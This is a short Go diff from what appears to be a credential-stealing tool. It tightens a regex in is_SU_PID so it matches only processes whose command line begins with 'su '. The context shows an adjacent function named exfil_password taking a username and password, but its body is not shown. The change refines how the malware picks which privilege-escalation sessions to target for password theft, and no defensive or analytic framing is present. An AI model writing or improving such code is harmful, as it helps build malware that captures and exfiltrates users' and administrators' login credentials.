@@ -44,7 +44,7 @@ func is_SU_PID(pid int) bool {
 	if err != nil {
 		return false
 	}
-	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
 }
 
 func exfil_password(username, password string) {
